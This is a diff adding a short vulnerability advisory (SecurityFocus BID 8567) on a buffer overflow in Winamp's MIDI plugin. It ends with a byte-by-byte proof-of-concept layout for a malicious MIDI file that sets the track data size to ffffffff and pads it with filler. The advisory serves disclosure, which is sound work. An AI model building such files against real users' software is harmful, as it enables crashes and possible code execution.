@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/8567/info
+
+Winamp MIDI plugin, IN_MIDI.DLL has been reported prone to a buffer overflow issue when handling malicious MIDI files. The issue presents itself when a malicious value is passed as the Track Data Size of a malicious MIDI file header. Although unconfirmed it has been conjectured that an attacker may exploit this condition to execute arbitrary code in the context of the user who is running the affected Winamp player. 
+
+4 bytes MIDI Header "MThd"
+4 bytes Header data size 00000006
+2 bytes Format 0000
+2 bytes Number of tracks 0001
+2 bytes Divisions 0001
+4 bytes Track Header "MTrk"
+4 bytes Track data size ffffffff <--- bug
+... "aaaaaaaaaaaaaaaaaaaaa..." <--- fun 
